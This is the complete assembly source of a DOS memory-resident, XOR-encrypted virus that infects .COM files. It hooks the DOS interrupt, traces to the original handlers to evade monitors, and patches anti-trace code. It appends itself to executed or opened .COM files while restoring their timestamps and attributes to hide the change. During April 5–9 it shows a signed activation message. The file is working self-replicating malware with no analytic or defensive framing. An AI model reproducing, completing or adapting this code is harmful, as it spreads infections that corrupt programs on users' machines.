        radix 16

        length          equ     end - start
        enc_length      equ     enc_end - enc_start
        enc_copy        equ     offset end + length + 1

        org 100

start:  mov cx,enc_length
        mov bx,offset enc_start
        db 0b2
enc_dl  db 0
s_e_next:out 06,al
        xor byte ptr cs:[bx],dl
        xor dx,[bx]
        out 06,al
        int 1
        inc bx
        loop s_e_next

enc_start: mov ah,02a
        int 21
        cmp dx,0405
        jb dont_activate
        cmp dx,0409
        ja dont_activate
        call activate

dont_activate: mov ah,0ff
        int 21
        cmp ax,0dead
        jnz not_installed
        mov ah,0fe 
        int 21

not_installed:          

        mov ax,3521
        int 21
        cs:mov prev_21_off,bx
        cs:mov prev_21_seg,es

        cs:mov word ptr [trace_off-2],offset traced_dos_off
        cs:mov word ptr [trace_seg-2],offset traced_dos_seg
        cs:mov word ptr [trace_aim-1],07203

        clc                                        
        mov ax,3501                            
        int 21                                 
        mov int1_seg,es                          
        mov int1_off,bx                          
        mov ax,2501                            
        mov dx,offset int1_handler                            
        int 21                                 
        pushf                                      
        pushf                                      
        pop ax                                 
        or ah,01                              
        push ax                                 
        popf    
        xor ax,ax                              
        mov ds,ax                              
        mov ah,52                              
        call far [0084]                         
        mov cs:lol_es,es
        mov cs:lol_bx,bx
        
        clc
        cs:mov word ptr [trace_off-2],offset traced_int13_off
        cs:mov word ptr [trace_seg-2],offset traced_int13_seg
        cs:mov word ptr [trace_aim-1],073f0
        pushf                                      
        pushf                                      
        pop ax                                 
        or ah,01                              
        push ax                                 
        popf    
        xor ax,ax                              
        mov ds,ax                              
        mov ah,0                              
        mov dl,080
        call far [004c]                         
        
        mov ax,2501
        cs:
        lds dx, offset int1_off
        int 21
        mov ds,cs
        mov es,cs
        cld
        sti
        les bx,offset lol_bx
        mov ax,es:[bx-2]
             
mcb_loop:        
        mov ds,ax
        add ax,[3]
        inc ax
        cmp byte ptr [0],'Z'
        jnz mcb_loop
        
        push ds
        mov ds,ax
        cmp byte ptr [0],'M'
        pop ds
        jz mcb_loop
        mov bx, ((((length) * 3) + 100) / 10) + 1  
        sub ax,bx
        sub [3],bx
        
        mov es,ax
        mov di,100
        mov si,di
        mov cx,length
        mov ds,cs
        repz movsb
        
        mov ax,2521
        mov ds,es
        mov dx,offset int21_handler
        call int21

        mov ah,0fe
        int 21

int1_handler:
        push bp                                 
        mov bp,sp                              
        cmp byte ptr [bp+05],03                
trace_aim: jb is_low_seg                               
        
        push cx,di,si,ds,es
        mov cx,0d
        mov ds,cs
        mov si,offset anti_trace_sig
        mov es,[bp+4]
        mov di,[bp+2]
        repz cmpsb
        if z mov byte ptr es:[di],0eb
        pop es,ds,si,di,cx
        
        or byte ptr [bp+07],01                
        pop bp                                 
        iret                                       

is_low_seg:
        push ax                                 
        mov ax,[bp+2]
        
        mov cs:traced_dos_off,ax
trace_off: mov ax,[bp+4]
        
        mov cs:traced_dos_seg,ax
trace_seg: and byte ptr [bp+07],0fe                
        
        pop ax                                 
        pop bp                                 
        iret                                       
        

int21_handler:
        pushf
        
        cmp ah,0fe
        jz is_fe
        
        cmp ah,0ff
        jz is_ff
        
        push ax, bx, cx ,dx, ds, es, di, si
        
        cmp ah,04b
        if z call infector
        
        cmp ah,03d
        jz open_file

        cmp ah,03c
        jz open_file

exit_21: pop si, di, es, ds, dx, cx, bx, ax
        popf
        db 0ea
prev_21_off dw 0
prev_21_seg dw 0

is_fe:  pop ax
        pop ax
        pop ax
        mov ds,ax
        mov es,ax
        mov ss,ax
        mov sp,0ffee
        mov si,word ptr file_length
        mov di,100
        add si,di
        push ds
        push di
        mov cx,length
        repz movsb
        iret

is_ff:  mov ax,0dead
        popf
        iret

open_file: mov si,dx
        mov ah,'.'
o_next_char: lodsb
        cmp al,ah
        jnz o_next_char
        mov es,cs
        mov di,offset com_ext
        mov cx,3
ext_test: lodsb
        or al,20
        scasb
        loope ext_test
        if z call infector
        jmp exit_21


infector:mov si,dx
        mov ah,'.'
next_char:lodsb
        cmp al,ah
        jnz next_char
        sub si,08
        mov es,cs
        mov di,offset command_com
        mov cx,7
name_test: lodsb
        or al,20
        scasb
        loope name_test
        if z ret
        cs:mov file_name_ds,ds
        mov ds,cs
        mov file_name_dx,dx
        
        mov ax,3524
        call int21
        mov int24_seg,es
        mov int24_off,bx
        mov dx,offset int24_handler
        mov ax,2524
        call int21
        
        mov ax,3513
        call int21
        mov int13_seg,es
        mov int13_off,bx
        lds dx,traced_int13_off
        mov ax,2513
        call int21

        cs:lds dx,file_name_dx
        mov ax,03d02
        call int21
        if c jmp e_f_nc
        mov bx,ax
        cs:mov file_handle,ax
        
        mov ax,5700
        call int21
        cs:mov file_date,dx
        cs:mov file_time,cx

        mov ax,4300
        call int21
        cs:mov file_attribs,cx
        xor cx,cx
        mov ax,4301
        call int21
        
        mov cx,length
        mov ds,cs
        mov dx,offset end
        mov ah,03f
        call int21
        
        mov cx,7
        mov es,cs
        mov si,offset start
        mov di,offset end
        repz cmpsb
        jz exit_infector
        
        cmp word ptr end,'ZM'
        jz exit_infector
        
        xor cx,cx
        xor dx,dx
        mov ax,4202
        call int21
        cmp ax,length
        jb exit_infector
        cmp ax,0feff - length
        jnb exit_infector
        cs:mov word ptr file_length,ax
        
        mov ah,40
        mov cx,length
        mov dx,offset end
        call int21
        
        xor cx,cx
        xor dx,dx
        mov ax,4200
        call int21
        
        mov cx,length
        mov si,offset start
        mov di,enc_copy
        repz movsb

        mov ah,2
        int 01a
        mov dl,dh
        add dl,cl
        push bx
        mov bx,offset enc_copy + (enc_start - start)
        mov cx,enc_length

        mov [enc_copy + (enc_dl - start)], dl 
        
i_e_next:       
        mov ax,cs:[bx]
        xor byte ptr cs:[bx],dl
        xor dx,ax
        inc bx
        loop i_e_next

        pop bx
        mov ah,40
        mov dx,offset enc_copy
        mov cx,length
        call int21
        
exit_infector: sti
        clc

        mov ax,5701
        cs:mov cx,file_time
        cs:mov dx,file_date
        call int21

        mov ah,03e
        call int21
        cs:lds dx,file_name_dx
        
e_f_nc: mov ax,4301
        cs:mov cx,file_attribs
        call int21
        
        cs:lds dx,int24_off
        mov ax,2524
        call int21
        
        cs:lds dx,int13_off
        mov ax,2513
        call int21
        ret
       
int24_handler:mov al,0
        iret
                
        
int21:  pushf
        call far cs:traced_dos_off
        ret

activate: mov ds,cs
        mov dx,offset activ_msg
        mov ah,09
        int 21
        xor ax,ax
        int 16
        ret

activ_msg:
        db 0a, 0d
        db ' Your Computers Just A'      , 0a, 0d 
        db '   Microscopic  Cog,'       , 0a, 0d
        db 'In My Catastrophic Plan.'   , 0a, 0d
        db 'Designed  and Directed -'    , 0a, 0d
        db 'By My Red Right Hand....'   , 0a, 0a, 0d

        db '[DãSiLLÅSçîNãSÁ] by -=SêpóLÁÅrí=-', 0a, 0a, 0d
        
        db 'Dedicated To Kurt Cobain,', 0a, 0d
        db '1967 - 1994.', 0a, 0a, 0d
        
        db '<< PRESS A KEY >>', 0a, 0d
        db '$'
anti_trace_sig: db 0fa, 09c, 0fc, 053, 050, 093, 058, 04c, 04c, 05b, 03b, 0c3, 05b, 074
      
command_com db 'command.'
com_ext     db 'com', 0

lol_bx  dw 0
lol_es  dw 0
 
traced_dos_off dw 0
traced_dos_seg dw 0
  
traced_int13_off dw 0
traced_int13_seg dw 0

int1_off dw 0
int1_seg dw 0

int13_off dw 0
int13_seg dw 0

int24_off dw 0
int24_seg dw 0

file_name_dx dw 0
file_name_ds dw 0

file_handle  dw 0  
file_attribs dw 0
file_date    dw 0
file_time    dw 0

enc_end:
file_length  dw length - 2

int 20
end:
